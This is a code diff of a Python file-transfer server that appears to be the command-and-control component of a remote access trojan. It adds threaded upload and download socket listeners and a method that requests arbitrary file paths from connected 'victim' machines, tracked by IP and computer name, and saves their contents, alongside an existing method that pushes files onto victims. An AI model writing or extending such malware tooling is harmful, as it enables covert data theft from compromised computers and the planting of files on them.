@@ -6,26 +6,49 @@ import time
 
 
 class FileTransferManager:
-    def __init__(self, host, port, victim_list):
-        self.host = host
-        self.port = port
-        self.clients = []
-        self.victim_list = victim_list
+    def __init__(self, upload_host, upload_port, download_host, download_port):
+        self.upload_host = upload_host
+        self.upload_port = upload_port
 
-    def start_server(self):
+        self.download_host = download_host
+        self.download_port = download_port
+        self.upload_clients = []
+
+        self.download_clients = []
+
+    def start_upload_server(self):
         # Initialize a socket for file transfers
-        file_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        file_server.bind((self.host, self.port))
-        file_server.listen(5)
+        upload_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        upload_server.bind((self.upload_host, self.upload_port))
+        upload_server.listen(5)
         print(
-            f"[*] File transfer server is listening on {self.host}:{self.port}")
+            f"[*] File transfer server is listening on {self.upload_host}:{self.upload_port}")
 
         while True:
-            client_socket, addr = file_server.accept()
+            client_socket, addr = upload_server.accept()
             print(f"[*] File transfer connection established with {addr[0]}")
 
-            # Add the client socket to the list of clients
-            self.clients.append((client_socket, addr))
+            # Add the client socket to the list of upload_clients
+            self.upload_clients.append((client_socket, addr))
+
+            # Handle file transfer logic here
+            threading.Thread(target=self.handle_file_transfer,
+                             args=(client_socket,)).start()
+
+    def start_download_server(self):
+        # Initialize a socket for file transfers
+        download_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        download_server.bind((self.download_host, self.download_port))
+        download_server.listen(5)
+        print(
+            f"[*] File transfer server is listening on {self.download_host}:{self.download_port}")
+
+        while True:
+            client_socket, addr = download_server.accept()
+            print(f"[*] File transfer connection established with {addr[0]}")
+
+            # Add the client socket to the list of download_clients
+            self.download_clients.append((client_socket, addr))
 
             # Handle file transfer logic here
             threading.Thread(target=self.handle_file_transfer,
@@ -71,14 +94,12 @@ class FileTransferManager:
 
             except Exception as e:
                 print(f"[*] Error handling file transfer: {str(e)}")
+                break
 
     async def upload_file(self, victim, file: UploadFile):
-        print(f"[*] Uploading file: {file.filename} to {victim['Name']}")
-        print(f"[*] Clients list: {self.clients}")
-        for client_socket, client_addr in self.clients:
-            print(f"[*] Checking client socket: {client_addr[0]}")
-            if client_addr[0] == victim["socket_ip"]:
-                print(f"[*] Found client socket for {victim['Name']}")
+        for client_socket, client_addr in self.upload_clients:
+            if client_addr[0] == victim.socket_ip:
+                print(f"[*] Found client socket for {victim.computer_name}")
                 try:
                     # Send the file name and size
                     client_socket.send(file.filename.encode())
@@ -99,6 +120,36 @@ class FileTransferManager:
                         f"[*] Uploaded file: {file.filename} to {client_addr[0]}")
                 except Exception as e:
                     print(f"[*] Error uploading file: {str(e)}")
+
+    async def download_file(self, victim, filepath):
+        print(f"[*] Downloading file: {filepath} from {victim.computer_name}")
+        print(f"[*] upload_clients list: {self.download_clients}")
+        for client_socket, client_addr in self.download_clients:
+            print(f"[*] Checking client socket: {client_addr[0]}")
+            if client_addr[0] == victim.socket_ip:
+                print(f"[*] Found client socket for {victim.computer_name}")
+                try:
+                    # Send the file name and size
+                    client_socket.send(filepath.encode())
+
+                    # Receive the file size
+                    file_size = int(client_socket.recv(1024).decode())
+
+                    # Receive and save the file data
+                    with open(filepath, "wb") as file:
+                        remaining_bytes = file_size
+                        while remaining_bytes > 0:
+                            data = client_socket.recv(
+                                min(remaining_bytes, 1024))
+                            if not data:
+                                break
+                            file.write(data)
+                            remaining_bytes -= len(data)
+
+                    print(
+                        f"[*] Downloaded file: {filepath} from {client_addr[0]}")
+                except Exception as e:
+                    print(f"[*] Error downloading file: {str(e)}")
 
     def set_victim_list(self, victim_list):
         self.victim_list = victim_list
